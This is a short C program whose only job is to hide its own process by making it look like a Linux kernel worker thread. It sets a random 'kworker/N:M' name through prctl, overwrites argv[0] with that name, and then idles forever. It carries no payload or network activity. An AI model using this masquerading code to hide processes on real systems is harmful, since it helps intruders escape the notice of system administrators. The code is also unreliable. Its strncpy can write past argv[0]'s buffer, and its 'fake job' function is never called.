#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/prctl.h>

void generate_fake_name(char *buf, size_t len) {
    int cpu = rand() % 16;
    int id = rand() % 100;

    snprintf(buf, len, "kworker/%d:%d", cpu, id);
}

/**
 * fake job to make the worker threads look busy
 */
void do_work(){
    while (1) {
        int total = 0;
        for (int i = 0; i < 1000; i++) {
            total += rand() % 100;
        }

        sleep(1);
    }
}

int main(int argc, char *argv[])
{
    char fake_name[64];
    generate_fake_name(fake_name, sizeof(fake_name));

    prctl(PR_SET_NAME, fake_name);

    memset(argv[0], 0, strlen(argv[0]));
    strncpy(argv[0], fake_name, strlen(fake_name));

    while (1) {
        sleep(60);
    }

    return 0;
}
